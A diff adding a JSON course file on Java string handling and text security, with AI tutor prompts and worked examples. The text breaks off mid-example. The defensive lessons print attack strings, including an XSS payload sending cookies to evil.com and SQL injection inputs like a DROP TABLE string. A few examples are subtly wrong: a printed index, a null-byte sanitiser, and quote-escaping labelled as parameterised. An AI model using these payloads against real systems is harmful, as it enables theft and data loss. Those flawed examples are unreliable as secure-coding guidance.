@@ -1,0 +1,1600 @@
+{
+  "course_id": "java_strings_security",
+  "title": "Strings & Text Security",
+  "description": "Master Java String manipulation, formatting, validation, and secure text handling to prevent injection and data leaks.",
+  "difficulty": "INTERMEDIATE",
+  "estimated_hours": 10,
+  "prerequisites": [
+    "java_collections"
+  ],
+  "learning_outcomes": [
+    "Create, compare, and manipulate strings using built-in methods",
+    "Understand String immutability and the string pool",
+    "Use StringBuilder for efficient string building",
+    "Format strings with printf and String.format",
+    "Split, join, and parse text data",
+    "Validate user input with string methods and regular expressions",
+    "Sanitise input to prevent injection attacks",
+    "Understand why == fails for string comparison and use equals correctly",
+    "Build secure text processing pipelines",
+    "Apply security-first thinking to all text handling"
+  ],
+  "neurodivergent_design": {
+    "visual_first": true,
+    "analogy_based": true,
+    "progressive_difficulty": true,
+    "colour_coded_sections": true,
+    "short_focused_exercises": true,
+    "immediate_feedback": true,
+    "multiple_explanation_styles": true,
+    "estimated_focus_time_per_exercise": "3-5 minutes"
+  },
+  "ai_tutor_config": {
+    "personality": "Encouraging, patient, uses real-world analogies. Never judges. Celebrates small wins. Explains strings like everyday text messages, letters, and forms.",
+    "intervention_triggers": {
+      "idle_40_seconds": "Hey, still with me? Strings are everywhere in programming -- every username, password, message, and URL is a string. If something feels confusing, just ask! I love explaining things with text message analogies.",
+      "idle_90_seconds": "Taking a moment to think is perfectly fine! Strings have a LOT of methods. You do not need to memorise them all -- just know the common ones: length(), charAt(), substring(), equals(), contains(). Want me to give you a quick cheat sheet?",
+      "idle_180_seconds": "No rush at all! String security is one of those topics that makes you a much better developer. Take a short break if you need one -- when you come back I will recap exactly where you left off and we will tackle it together.",
+      "first_error": "Nice try! String errors are super common. The biggest trap is using == instead of .equals() for comparison. Let me show you exactly what went wrong and why.",
+      "repeated_errors": "I can see this one is tricky. Let me try a different approach. Think of a String like a text message on your phone -- once sent, you cannot edit it. Every 'change' creates a new message. Want me to walk through it step by step?",
+      "after_success": "Brilliant! String handling is one of the most practical skills in programming. Every web form, every API, every database query uses strings. You are building real security skills!"
+    },
+    "encouragement_phrases": [
+      "Every website login you have ever used relies on string handling -- you are learning essential skills!",
+      "String security prevents real attacks. You are thinking like a security professional now!",
+      "The difference between == and .equals() trips up even experienced developers. Great job understanding it!",
+      "StringBuilder might seem small but it is used in every high-performance Java application.",
+      "Input validation is the FIRST line of defence. You are building that skill right now!",
+      "Regular expressions are like a superpower -- hard to learn, incredibly useful once you do.",
+      "You are moving from coding to SECURE coding. That is a big step forward!",
+      "Every exercise you complete makes your code more secure. Keep going!",
+      "Professional developers spend a LOT of time on string handling. You are building real expertise.",
+      "The fact that you are learning about injection prevention shows real security awareness."
+    ],
+    "explanation_styles": {
+      "analogy": "A String is like a text message -- once sent, it cannot be changed. If you want to 'edit' it, you actually create a new message. StringBuilder is like a draft message you can edit before sending.",
+      "visual": "String pool: imagine a library. 'Hello' is one book. Every variable pointing to 'Hello' shares the SAME book. Creating new String('Hello') buys a private copy nobody shares.",
+      "step_by_step": "Step 1: Create string. Step 2: Never use == for comparison, use .equals(). Step 3: Validate input before using it. Step 4: Sanitise to remove dangerous characters. Step 5: Use parameterised queries for databases.",
+      "code_trace": "String s = 'Hello'; s = s + ' World'; -- Line 1 creates 'Hello' in pool. Line 2 creates NEW string 'Hello World'. Original 'Hello' still exists in memory. s now points to new string.",
+      "comparison": "String = immutable (cannot change). StringBuilder = mutable (can modify in place). char[] = raw characters. String is safest but slowest for building. StringBuilder is fastest for building."
+    }
+  },
+  "lessons": [
+    {
+      "lesson_id": "java_strings_security_lesson_1",
+      "title": "Strings & Text Security",
+      "theory": {
+        "introduction": "Strings are the most common data type in programming. Every username, password, email, URL, message, file path, and database query is a string. If you build any application -- web, mobile, desktop -- you will spend a LOT of time working with strings.\n\nBut here is the twist: strings are also the NUMBER ONE attack surface in software security. SQL injection, cross-site scripting (XSS), path traversal, command injection -- they ALL exploit string handling mistakes. A single unvalidated string from a user can crash your server, steal your database, or take over accounts.\n\nThis topic teaches you both sides: how to USE strings effectively (manipulation, formatting, parsing) and how to PROTECT your application (validation, sanitisation, secure comparison). By the end, you will think about every piece of text as both useful data AND a potential threat.\n\nThink of strings like letters arriving at your front door. Most are genuine -- bills, cards from friends, newsletters. But some might be scams trying to trick you into giving away your bank details. You need to read them (string manipulation) AND check them carefully (string security).",
+        "why_important": "String vulnerabilities cause more real-world breaches than almost any other bug type. The OWASP Top 10 lists injection as one of the most critical web application security risks. Every input field on every website is a potential entry point for attackers. Learning secure string handling is not optional -- it is essential for any developer who writes code that touches user input, which is virtually every developer.",
+        "key_concepts": [
+          {
+            "concept": "String Basics -- Creation and Immutability",
+            "explanation": "In Java, strings are IMMUTABLE -- once created, they cannot be changed. Every operation that seems to change a string actually creates a NEW string.\n\nThink of it like a printed book. You cannot edit a printed page. To make changes, you print a new page. The old one still exists until garbage collection removes it.\n\nTwo ways to create strings:\n- String literal: String s = \"Hello\"; (uses string pool, efficient)\n- new keyword: String s = new String(\"Hello\"); (creates new object, wastes memory)\n\nAlways use literals unless you have a specific reason for new.",
+            "example": "String s1 = \"Hello\";           // string pool\nString s2 = \"Hello\";           // same object as s1!\nString s3 = new String(\"Hello\"); // different object\n\nSystem.out.println(s1 == s2);      // true (same pool object)\nSystem.out.println(s1 == s3);      // false (different objects!)\nSystem.out.println(s1.equals(s3)); // true (same content)\n\n// Immutability demo\nString greeting = \"Hello\";\ngreeting.toUpperCase();  // returns \"HELLO\" but greeting is STILL \"Hello\"\ngreeting = greeting.toUpperCase();  // NOW greeting is \"HELLO\" (new string assigned)",
+            "ai_hint": "GOLDEN RULE: Always use .equals() to compare string CONTENT. == compares memory addresses."
+          },
+          {
+            "concept": "String Comparison -- equals vs ==",
+            "explanation": "This is the MOST COMMON Java mistake:\n- == checks if two variables point to the SAME OBJECT in memory\n- .equals() checks if two strings have the SAME CONTENT\n\nThink of identical twins. They LOOK the same (equals) but they are DIFFERENT people (==). You almost always want .equals().\n\nAlso use .equalsIgnoreCase() for case-insensitive comparison. For security, use constant.equals(variable) not variable.equals(constant) to avoid NullPointerException.",
+            "example": "String a = \"hello\";\nString b = \"hello\";\nString c = new String(\"hello\");\nString d = \"Hello\";\n\nSystem.out.println(a == b);               // true (pool)\nSystem.out.println(a == c);               // false (different objects)\nSystem.out.println(a.equals(c));          // true (same content)\nSystem.out.println(a.equals(d));          // false (case differs)\nSystem.out.println(a.equalsIgnoreCase(d)); // true\n\n// SAFE pattern (prevents NullPointerException)\n\"admin\".equals(username);  // safe even if username is null",
+            "ai_hint": "Put the KNOWN string first: 'admin'.equals(input) is safer than input.equals('admin') because input might be null."
+          },
+          {
+            "concept": "Essential String Methods",
+            "explanation": "Java strings have dozens of built-in methods. The most important ones:\n\nlength() -- character count\ncharAt(i) -- character at position\nsubstring(start, end) -- extract portion\ntoUpperCase() / toLowerCase() -- case conversion\ntrim() -- remove leading/trailing whitespace\ncontains(str) -- check if substring exists\nstartsWith(str) / endsWith(str) -- check prefix/suffix\nindexOf(str) -- find position (-1 if not found)\nreplace(old, new) -- replace all occurrences\nisEmpty() -- true if length is 0\n\nAll return NEW strings (immutability!).",
+            "example": "String text = \"  Hello, World!  \";\n\nSystem.out.println(text.length());         // 17 (includes spaces)\nSystem.out.println(text.trim());           // \"Hello, World!\"\nSystem.out.println(text.trim().length());  // 13\nSystem.out.println(text.charAt(2));        // 'H' (index 2)\nSystem.out.println(text.contains(\"World\")); // true\nSystem.out.println(text.indexOf(\"World\")); // 9\nSystem.out.println(text.toUpperCase());    // \"  HELLO, WORLD!  \"\nSystem.out.println(text.replace(\"World\", \"Java\")); // \"  Hello, Java!  \"\nSystem.out.println(text.startsWith(\"  H\")); // true",
+            "ai_hint": "All these methods return a NEW string. The original text is NEVER modified (immutability)."
+          },
+          {
+            "concept": "Substring -- Extracting Parts",
+            "explanation": "substring(start) returns from start to end of string.\nsubstring(start, end) returns from start to end-1.\n\nThink of it like cutting a ribbon. You specify where to start cutting and where to stop. The end index is EXCLUSIVE (not included).\n\nCommon use: extract domain from email, get file extension, parse CSV fields.",
+            "example": "String email = \"alice@company.com\";\n\n// Get username (before @)\nint at = email.indexOf(\"@\");\nString user = email.substring(0, at);      // \"alice\"\nString domain = email.substring(at + 1);   // \"company.com\"\n\nSystem.out.println(\"User: \" + user);\nSystem.out.println(\"Domain: \" + domain);\n\n// Get file extension\nString file = \"report.pdf\";\nString ext = file.substring(file.lastIndexOf(\".\") + 1); // \"pdf\"",
+            "ai_hint": "substring(0, 5) gives characters at index 0,1,2,3,4. The end index (5) is NOT included."
+          },
+          {
+            "concept": "Split and Join -- Parsing Text",
+            "explanation": "split(delimiter) breaks a string into an array of parts.\nString.join(delimiter, array) combines parts back into one string.\n\nThink of split like cutting a pizza along the lines. Join is putting slices back together.\n\nCritical for: parsing CSV files, processing URLs, handling user input, reading log files.",
+            "example": "String csv = \"Alice,25,London,Engineer\";\nString[] parts = csv.split(\",\");\nfor (String p : parts) System.out.println(p);\n// Alice, 25, London, Engineer\n\nString[] words = {\"Java\", \"is\", \"great\"};\nString sentence = String.join(\" \", words);\nSystem.out.println(sentence);  // \"Java is great\"\n\n// Split with limit\nString data = \"name:Alice:Bob:Charlie\";\nString[] limited = data.split(\":\", 2);  // max 2 parts\nSystem.out.println(limited[0]); // \"name\"\nSystem.out.println(limited[1]); // \"Alice:Bob:Charlie\"",
+            "ai_hint": "split takes a REGEX pattern. To split on . use split('\\\\.') because . means 'any character' in regex."
+          },
+          {
+            "concept": "StringBuilder -- Efficient String Building",
+            "explanation": "Every time you concatenate with +, Java creates a new String object. In a loop, this wastes huge amounts of memory.\n\nStringBuilder is a MUTABLE string. You can append, insert, delete without creating new objects each time.\n\nThink of String like writing in ink (permanent). StringBuilder is like writing in pencil (erasable).\n\nRule of thumb: use + for simple concatenation. Use StringBuilder inside loops or when building large strings.",
+            "example": "// BAD: creates many temporary String objects\nString result = \"\";\nfor (int i = 0; i < 5; i++) {\n    result += i + \" \";  // new String each time!\n}\n\n// GOOD: one StringBuilder, append in place\nStringBuilder sb = new StringBuilder();\nfor (int i = 0; i < 5; i++) {\n    sb.append(i).append(\" \");\n}\nString result2 = sb.toString();\nSystem.out.println(result2);  // \"0 1 2 3 4 \"\n\n// StringBuilder methods\nsb.insert(0, \"Numbers: \");\nsb.delete(sb.length()-1, sb.length());  // remove trailing space\nSystem.out.println(sb);  // \"Numbers: 0 1 2 3 4\"",
+            "ai_hint": "In a loop of 10,000 iterations, StringBuilder is 100x faster than String +. Always use it in loops."
+          },
+          {
+            "concept": "String Formatting -- printf and format",
+            "explanation": "String.format() and System.out.printf() create formatted strings using placeholders:\n\n%s = string, %d = integer, %f = float, %b = boolean\n%.2f = float with 2 decimal places\n%10s = right-align in 10 chars\n%-10s = left-align in 10 chars\n%n = newline (platform-independent)\n\nThink of it like a template letter with blanks: 'Dear [NAME], your order [NUMBER] totals [PRICE].'",
+            "example": "String name = \"Alice\";\nint age = 25;\ndouble score = 92.567;\n\nSystem.out.printf(\"Name: %s, Age: %d%n\", name, age);\nSystem.out.printf(\"Score: %.2f%n\", score);\nSystem.out.printf(\"%-10s | %5d | %8.2f%n\", \"Alice\", 25, 92.57);\nSystem.out.printf(\"%-10s | %5d | %8.2f%n\", \"Bob\", 30, 85.33);\n\n// String.format returns a String (does not print)\nString msg = String.format(\"Hello %s, you scored %.1f%%\", name, score);\nSystem.out.println(msg);",
+            "ai_hint": "printf PRINTS directly. String.format RETURNS a string. Use format when you need to store the result."
+          },
+          {
+            "concept": "Input Validation -- The First Line of Defence",
+            "explanation": "NEVER trust user input. Every string from outside your program could be:\n- Empty or null\n- Too long (buffer overflow attempt)\n- Contains special characters (injection attempt)\n- Wrong format (not a valid email, number, etc.)\n\nValidation means checking input BEFORE using it. Like a bouncer at a club checking IDs before letting people in.\n\nBasic checks: not null, not empty, correct length, correct format, no dangerous characters.",
+            "example": "static boolean isValidUsername(String input) {\n    if (input == null) return false;\n    if (input.trim().isEmpty()) return false;\n    if (input.length() < 3 || input.length() > 20) return false;\n    // Only letters, numbers, underscore\n    if (!input.matches(\"[a-zA-Z0-9_]+\")) return false;\n    return true;\n}\n\nSystem.out.println(isValidUsername(\"alice_99\"));   // true\nSystem.out.println(isValidUsername(\"\"));           // false\nSystem.out.println(isValidUsername(\"ab\"));         // false (too short)\nSystem.out.println(isValidUsername(\"admin<script>\")); // false (special chars)",
+            "ai_hint": "Validate EARLY, validate STRICTLY. It is easier to reject bad input than to fix it later."
+          },
+          {
+            "concept": "Input Sanitisation -- Cleaning Dangerous Text",
+            "explanation": "Sanitisation means CLEANING input to remove or escape dangerous characters. Used AFTER validation as an extra safety layer.\n\nCommon sanitisation:\n- Remove HTML tags to prevent XSS\n- Escape single quotes to prevent SQL injection\n- Remove path separators to prevent directory traversal\n- Trim whitespace to prevent padding attacks\n\nThink of sanitisation like going through airport security: remove your belt, empty your pockets, walk through the scanner.",
+            "example": "static String sanitise(String input) {\n    if (input == null) return \"\";\n    String clean = input.trim();\n    // Remove HTML tags\n    clean = clean.replaceAll(\"<[^>]*>\", \"\");\n    // Escape single quotes (SQL protection)\n    clean = clean.replace(\"'\", \"''\");\n    // Remove null bytes\n    clean = clean.replace(\"\\\\0\", \"\");\n    return clean;\n}\n\nSystem.out.println(sanitise(\"<script>alert('XSS')</script>\"));\n// Output: alert(''XSS'')\nSystem.out.println(sanitise(\"  normal input  \"));\n// Output: normal input",
+            "ai_hint": "Sanitisation is a SAFETY NET, not a replacement for validation. Always validate first, then sanitise."
+          },
+          {
+            "concept": "SQL Injection Prevention",
+            "explanation": "SQL injection is one of the most dangerous attacks. It works by inserting SQL commands into string input.\n\nExample attack: username = \"admin' OR '1'='1\" turns a login query into one that always succeeds.\n\nPrevention: NEVER build SQL queries by concatenating strings. Use parameterised queries (PreparedStatement) which separate code from data.\n\nThink of it like a form with fixed fields. You can fill in the blanks but you cannot change the form structure.",
+            "example": "// DANGEROUS -- string concatenation\nString user = request.getParameter(\"user\");\nString query = \"SELECT * FROM users WHERE name = '\" + user + \"'\";\n// If user = admin' OR '1'='1\n// Query becomes: SELECT * FROM users WHERE name = 'admin' OR '1'='1'\n// This returns ALL users!\n\n// SAFE -- parameterised query\nString query2 = \"SELECT * FROM users WHERE name = ?\";\nPreparedStatement ps = conn.prepareStatement(query2);\nps.setString(1, user);  // user input is treated as DATA, not SQL\nResultSet rs = ps.executeQuery();",
+            "ai_hint": "The ? placeholder makes the database treat input as pure data, never as SQL code. This stops injection completely."
+          },
+          {
+            "concept": "Cross-Site Scripting (XSS) Prevention",
+            "explanation": "XSS attacks inject JavaScript through input fields. When the text is displayed in a web page, the script runs in other users browsers.\n\nExample attack: comment = '<script>document.location=\"http://evil.com/steal?\"+document.cookie</script>'\n\nPrevention: escape HTML special characters before displaying user content:\n& becomes &amp; < becomes &lt; > becomes &gt; ' becomes &#39; \" becomes &quot;\n\nThink of XSS like someone putting a fake sign in a shop: customers trust the shop, so they follow the fake sign.",
+            "example": "static String escapeHtml(String input) {\n    if (input == null) return \"\";\n    return input\n        .replace(\"&\", \"&amp;\")\n        .replace(\"<\", \"&lt;\")\n        .replace(\">\", \"&gt;\")\n        .replace(\"\\\"\", \"&quot;\")\n        .replace(\"'\", \"&#39;\");\n}\n\nString evil = \"<script>alert('XSS')</script>\";\nSystem.out.println(escapeHtml(evil));\n// &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;\n// Browser shows it as TEXT, not executable code",
+            "ai_hint": "Order matters! Replace & FIRST, otherwise you double-encode the other replacements."
+          },
+          {
+            "concept": "Regular Expressions -- Pattern Matching",
+            "explanation": "Regular expressions (regex) define patterns for matching text. Like a search with wildcards on steroids.\n\nCommon patterns:\n[a-z] = one lowercase letter\n[0-9] or \\\\d = one digit\n+ = one or more\n* = zero or more\n{3,5} = between 3 and 5 times\n^ = start of string\n$ = end of string\n\nUse matches() for full string match. Use Pattern/Matcher for partial matching.",
+            "example": "String email = \"alice@company.com\";\nString phone = \"07700-123456\";\n\n// Validate email (simplified)\nboolean validEmail = email.matches(\"[a-zA-Z0-9.]+@[a-zA-Z0-9.]+\\\\.[a-zA-Z]{2,}\");\nSystem.out.println(\"Email valid: \" + validEmail); // true\n\n// Validate UK phone\nboolean validPhone = phone.matches(\"0\\\\d{4}-\\\\d{6}\");\nSystem.out.println(\"Phone valid: \" + validPhone); // true\n\n// Check for dangerous characters\nboolean safe = \"normalUser\".matches(\"[a-zA-Z0-9_]+\");\nboolean unsafe = \"user<script>\".matches(\"[a-zA-Z0-9_]+\");\nSystem.out.println(\"Safe: \" + safe + \", Unsafe: \" + unsafe);",
+            "ai_hint": "matches() checks the ENTIRE string. For partial matching use: Pattern.compile(regex).matcher(str).find()."
+          }
+        ]
+      },
+      "complete_examples": [
+        {
+          "title": "Example 1: String Creation and Basics",
+          "description": "Creating strings and using basic methods.",
+          "difficulty": "beginner",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        String greeting = \"Hello, World!\";\n        System.out.println(\"Text: \" + greeting);\n        System.out.println(\"Length: \" + greeting.length());\n        System.out.println(\"Char at 0: \" + greeting.charAt(0));\n        System.out.println(\"Char at 7: \" + greeting.charAt(7));\n        System.out.println(\"Upper: \" + greeting.toUpperCase());\n        System.out.println(\"Lower: \" + greeting.toLowerCase());\n        System.out.println(\"Trimmed: \" + \"  spaces  \".trim());\n        System.out.println(\"Empty: \" + \"\".isEmpty());\n        System.out.println(\"Empty: \" + greeting.isEmpty());\n    }\n}",
+          "output": "Text: Hello, World!\nLength: 13\nChar at 0: H\nChar at 7: W\nUpper: HELLO, WORLD!\nLower: hello, world!\nTrimmed: spaces\nEmpty: true\nEmpty: false",
+          "ai_explanation": "length() counts all characters including spaces and punctuation. charAt(0) gives the first character. toUpperCase/toLowerCase return NEW strings. trim() removes leading and trailing whitespace. isEmpty() checks if length is 0.",
+          "ai_challenge": "Try greeting.charAt(greeting.length() - 1) to get the last character."
+        },
+        {
+          "title": "Example 2: String Comparison -- The == Trap",
+          "description": "Why == fails and equals() is essential.",
+          "difficulty": "beginner",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        String a = \"hello\";\n        String b = \"hello\";\n        String c = new String(\"hello\");\n        String d = \"Hello\";\n\n        System.out.println(\"a == b: \" + (a == b));\n        System.out.println(\"a == c: \" + (a == c));\n        System.out.println(\"a.equals(b): \" + a.equals(b));\n        System.out.println(\"a.equals(c): \" + a.equals(c));\n        System.out.println(\"a.equals(d): \" + a.equals(d));\n        System.out.println(\"a.equalsIgnoreCase(d): \" + a.equalsIgnoreCase(d));\n\n        // SAFE null-safe pattern\n        String input = null;\n        System.out.println(\"Safe check: \" + \"hello\".equals(input));\n        // System.out.println(input.equals(\"hello\")); // NullPointerException!\n    }\n}",
+          "output": "a == b: true\na == c: false\na.equals(b): true\na.equals(c): true\na.equals(d): false\na.equalsIgnoreCase(d): true\nSafe check: false",
+          "ai_explanation": "a==b is true because both use the string pool (same object). a==c is false because 'new' creates a separate object. equals() checks content, so a.equals(c) is true. Put the constant first to avoid NullPointerException.",
+          "ai_challenge": "Never use == for string comparison in real code. Always use .equals() or .equalsIgnoreCase()."
+        },
+        {
+          "title": "Example 3: Substring and IndexOf",
+          "description": "Extract parts of strings and find positions.",
+          "difficulty": "beginner",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        String url = \"https://www.example.com/products/laptop\";\n\n        // Find positions\n        System.out.println(\"First /: \" + url.indexOf(\"/\"));\n        System.out.println(\"Last /: \" + url.lastIndexOf(\"/\"));\n        System.out.println(\"Contains 'product': \" + url.contains(\"product\"));\n\n        // Extract parts\n        String protocol = url.substring(0, url.indexOf(\"://\"));\n        String path = url.substring(url.lastIndexOf(\"/\") + 1);\n        System.out.println(\"Protocol: \" + protocol);\n        System.out.println(\"Last segment: \" + path);\n\n        // Email parsing\n        String email = \"alice.smith@company.co.uk\";\n        String user = email.substring(0, email.indexOf(\"@\"));\n        String domain = email.substring(email.indexOf(\"@\") + 1);\n        System.out.println(\"User: \" + user);\n        System.out.println(\"Domain: \" + domain);\n    }\n}",
+          "output": "First /: 6\nLast /: 30\nContains 'product': true\nProtocol: https\nLast segment: laptop\nUser: alice.smith\nDomain: company.co.uk",
+          "ai_explanation": "indexOf finds the first occurrence. lastIndexOf finds the last. substring(start, end) extracts -- end is EXCLUSIVE. These are the bread and butter of text parsing.",
+          "ai_challenge": "Extract the domain extension (co.uk) from the email."
+        },
+        {
+          "title": "Example 4: Split and Join",
+          "description": "Break strings apart and reassemble them.",
+          "difficulty": "beginner",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        // Split CSV\n        String csv = \"Alice,25,London,Engineer\";\n        String[] fields = csv.split(\",\");\n        System.out.println(\"Name: \" + fields[0]);\n        System.out.println(\"Age: \" + fields[1]);\n        System.out.println(\"City: \" + fields[2]);\n        System.out.println(\"Job: \" + fields[3]);\n\n        // Split with limit\n        String log = \"ERROR:2024-01-15:Connection timeout:retry in 5s\";\n        String[] parts = log.split(\":\", 3);\n        System.out.println(\"Level: \" + parts[0]);\n        System.out.println(\"Date: \" + parts[1]);\n        System.out.println(\"Message: \" + parts[2]);\n\n        // Join\n        String[] words = {\"Java\", \"is\", \"powerful\"};\n        System.out.println(String.join(\" \", words));\n        System.out.println(String.join(\" | \", \"A\", \"B\", \"C\"));\n    }\n}",
+          "output": "Name: Alice\nAge: 25\nCity: London\nJob: Engineer\nLevel: ERROR\nDate: 2024-01-15\nMessage: Connection timeout:retry in 5s\nJava is powerful\nA | B | C",
+          "ai_explanation": "split(\",\") divides at every comma. split(\":\", 3) limits to 3 parts -- the third part gets everything remaining. Join reconnects with a delimiter.",
+          "ai_challenge": "Parse this log: '192.168.1.1 - GET /index.html 200' into IP, method, path, status."
+        },
+        {
+          "title": "Example 5: StringBuilder in Action",
+          "description": "Efficient string building with StringBuilder.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        // Building a report\n        StringBuilder report = new StringBuilder();\n        report.append(\"=== REPORT ===\").append(\"\\n\");\n        String[] items = {\"Laptop\", \"Mouse\", \"Keyboard\"};\n        double[] prices = {999.99, 29.99, 79.99};\n\n        double total = 0;\n        for (int i = 0; i < items.length; i++) {\n            report.append(String.format(\"%d. %-12s $%.2f%n\", i+1, items[i], prices[i]));\n            total += prices[i];\n        }\n        report.append(\"\\nTotal: $\").append(String.format(\"%.2f\", total));\n        System.out.println(report.toString());\n\n        // StringBuilder methods\n        StringBuilder sb = new StringBuilder(\"Hello World\");\n        sb.insert(5, \",\");          // Hello, World\n        sb.replace(0, 5, \"Hi\");     // Hi, World\n        sb.reverse();                // dlroW ,iH\n        System.out.println(sb);\n    }\n}",
+          "output": "=== REPORT ===\n1. Laptop       $999.99\n2. Mouse        $29.99\n3. Keyboard     $79.99\n\nTotal: $1109.97\ndlroW ,iH",
+          "ai_explanation": "StringBuilder.append() modifies in place -- no new objects created. In a loop of 1000 items, this is 100x faster than string + concatenation. Use toString() to get the final String.",
+          "ai_challenge": "Build an HTML table using StringBuilder with 5 rows of data."
+        },
+        {
+          "title": "Example 6: String Formatting",
+          "description": "printf and String.format for professional output.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    public static void main(String[] args) {\n        // Table formatting\n        System.out.printf(\"%-15s %5s %10s%n\", \"Product\", \"Qty\", \"Price\");\n        System.out.printf(\"%-15s %5d %10.2f%n\", \"Laptop\", 2, 999.99);\n        System.out.printf(\"%-15s %5d %10.2f%n\", \"Mouse\", 5, 29.99);\n        System.out.printf(\"%-15s %5d %10.2f%n\", \"USB Hub\", 3, 19.99);\n\n        // String.format for reuse\n        String card = String.format(\"Card: **** **** **** %s\", \"4521\");\n        System.out.println(card);\n\n        // Padding and alignment\n        for (int i = 1; i <= 5; i++) {\n            System.out.printf(\"%3d | %s%n\", i, \"#\".repeat(i * 3));\n        }\n    }\n}",
+          "output": "Product           Qty      Price\nLaptop              2     999.99\nMouse               5      29.99\nUSB Hub             3      19.99\nCard: **** **** **** 4521\n  1 | ###\n  2 | ######\n  3 | #########\n  4 | ############\n  5 | ###############",
+          "ai_explanation": "%-15s left-aligns in 15 chars. %5d right-aligns integer in 5 chars. %10.2f right-aligns decimal with 2 places in 10 chars. printf prints directly. String.format returns a String.",
+          "ai_challenge": "Create a receipt with items, quantities, prices, and a total line."
+        },
+        {
+          "title": "Example 7: Input Validation",
+          "description": "Complete input validation for username, email, and password.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    static boolean isValidUsername(String s) {\n        if (s == null || s.trim().isEmpty()) return false;\n        if (s.length() < 3 || s.length() > 20) return false;\n        return s.matches(\"[a-zA-Z0-9_]+\");\n    }\n\n    static boolean isValidEmail(String s) {\n        if (s == null || s.trim().isEmpty()) return false;\n        if (!s.contains(\"@\") || !s.contains(\".\")) return false;\n        String[] parts = s.split(\"@\");\n        if (parts.length != 2) return false;\n        return parts[0].length() > 0 && parts[1].length() > 3;\n    }\n\n    static boolean isStrongPassword(String s) {\n        if (s == null || s.length() < 8) return false;\n        boolean hasUpper = false, hasLower = false, hasDigit = false, hasSpecial = false;\n        for (char c : s.toCharArray()) {\n            if (Character.isUpperCase(c)) hasUpper = true;\n            if (Character.isLowerCase(c)) hasLower = true;\n            if (Character.isDigit(c)) hasDigit = true;\n            if (!Character.isLetterOrDigit(c)) hasSpecial = true;\n        }\n        return hasUpper && hasLower && hasDigit && hasSpecial;\n    }\n\n    public static void main(String[] args) {\n        System.out.println(\"Username 'alice_99': \" + isValidUsername(\"alice_99\"));\n        System.out.println(\"Username 'ab': \" + isValidUsername(\"ab\"));\n        System.out.println(\"Username '<script>': \" + isValidUsername(\"<script>\"));\n        System.out.println(\"Email 'a@b.com': \" + isValidEmail(\"a@b.com\"));\n        System.out.println(\"Email 'invalid': \" + isValidEmail(\"invalid\"));\n        System.out.println(\"Password 'Str0ng!x': \" + isStrongPassword(\"Str0ng!x\"));\n        System.out.println(\"Password 'weak': \" + isStrongPassword(\"weak\"));\n    }\n}",
+          "output": "Username 'alice_99': true\nUsername 'ab': false\nUsername '<script>': false\nEmail 'a@b.com': true\nEmail 'invalid': false\nPassword 'Str0ng!x': true\nPassword 'weak': false",
+          "ai_explanation": "Three layers: null check, length check, format check. Username allows only safe characters. Email must have @ and domain. Password requires uppercase, lowercase, digit, and special character.",
+          "ai_challenge": "Add a phone number validator that accepts formats like 07700-123456 or +44 7700 123456."
+        },
+        {
+          "title": "Example 8: HTML Sanitisation",
+          "description": "Strip dangerous HTML to prevent cross-site scripting (XSS).",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    static String escapeHtml(String input) {\n        if (input == null) return \"\";\n        return input\n            .replace(\"&\", \"&amp;\")\n            .replace(\"<\", \"&lt;\")\n            .replace(\">\", \"&gt;\")\n            .replace(\"\\\"\", \"&quot;\")\n            .replace(\"'\", \"&#39;\");\n    }\n\n    static String stripTags(String input) {\n        if (input == null) return \"\";\n        return input.replaceAll(\"<[^>]*>\", \"\");\n    }\n\n    public static void main(String[] args) {\n        String attack = \"<script>alert('XSS')</script>\";\n        String sneaky = \"<img src=x onerror=alert('hack')>\";\n        String normal = \"Hello <b>World</b>\";\n\n        System.out.println(\"=== ESCAPE ===\");\n        System.out.println(escapeHtml(attack));\n        System.out.println(escapeHtml(sneaky));\n        System.out.println(escapeHtml(normal));\n\n        System.out.println(\"\\n=== STRIP ===\");\n        System.out.println(stripTags(attack));\n        System.out.println(stripTags(sneaky));\n        System.out.println(stripTags(normal));\n    }\n}",
+          "output": "=== ESCAPE ===\n&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;\n&lt;img src=x onerror=alert(&#39;hack&#39;)&gt;\nHello &lt;b&gt;World&lt;/b&gt;\n\n=== STRIP ===\nalert('XSS')\n\nHello World",
+          "ai_explanation": "escapeHtml converts dangerous characters to safe HTML entities -- the browser shows them as TEXT, not executable code. stripTags removes all HTML tags entirely. Escape when you want to SHOW the text. Strip when you want to REMOVE all formatting.",
+          "ai_challenge": "Test with: <a href='javascript:alert(1)'>Click me</a>"
+        },
+        {
+          "title": "Example 9: SQL Injection Demo",
+          "description": "Shows how string concatenation enables SQL injection.",
+          "difficulty": "intermediate",
+          "code": "public class Main {\n    static String buildQueryUnsafe(String username) {\n        return \"SELECT * FROM users WHERE name = '\" + username + \"'\";\n    }\n\n    static String buildQuerySafe(String username) {\n        // Simulating parameterised query\n        String cleaned = username.replace(\"'\", \"''\");\n        return \"SELECT * FROM users WHERE name = '\" + cleaned + \"'\";\n    }\n\n    public static void main(String[] args) {\n        // Normal input\n        System.out.println(\"Normal:\");\n        System.out.println(buildQueryUnsafe(\"alice\"));\n\n        // Attack input!\n        String attack = \"admin' OR '1'='1\";\n        System.out.println(\"\\nATTACK (unsafe):\");\n        System.out.println(buildQueryUnsafe(attack));\n        System.out.println(\"This returns ALL users!\");\n\n        System.out.println(\"\\nATTACK (escaped):\");\n        System.out.println(buildQuerySafe(attack));\n        System.out.println(\"This searches for literal text.\");\n\n        // Drop table attack\n        String drop = \"'; DROP TABLE users; --\";\n        System.out.println(\"\\nDROP TABLE (unsafe):\");\n        System.out.println(buildQueryUnsafe(drop));\n    }\n}",
+          "output": "Normal:\nSELECT * FROM users WHERE name = 'alice'\n\nATTACK (unsafe):\nSELECT * FROM users WHERE name = 'admin' OR '1'='1'\nThis returns ALL users!\n\nATTACK (escaped):\nSELECT * FROM users WHERE name = 'admin'' OR ''1''=''1'\nThis searches for literal text.\n\nDROP TABLE (unsafe):\nSELECT * FROM users WHERE name = ''; DROP TABLE users; --'",
